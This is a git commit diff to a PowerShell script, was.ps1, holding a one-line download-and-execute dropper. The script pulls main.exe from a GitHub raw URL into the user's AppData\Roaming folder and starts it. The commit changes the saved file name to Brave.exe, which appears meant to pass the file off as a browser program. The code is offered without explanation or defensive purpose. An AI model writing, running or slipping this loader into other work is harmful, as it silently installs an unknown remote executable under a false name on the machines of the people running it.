4a239ed5195c4b2f538954d0cd54bad16c569e48
Dev Patel <109647822+dev-eloper-365@users.noreply.github.com>
2022-08-08 17:46:07 +0530

    0

--- was.ps1
+++ was.ps1
@@ -1,1 +1,2 @@
-$e=New-Object System.Net.WebClient;$e.DownloadFile("https://github.com/dev-eloper-365/Tasks/raw/main/main.exe","$HOME\AppData\Roaming\jack.exe");Start-Process -FilePath "$HOME\AppData\Roaming\jack.exe"
+$n=Brave.exe
+$e=New-Object System.Net.WebClient;$e.DownloadFile("https://github.com/dev-eloper-365/Tasks/raw/main/main.exe","$HOME\AppData\Roaming\$n");Start-Process -FilePath "$HOME\AppData\Roaming\$n"
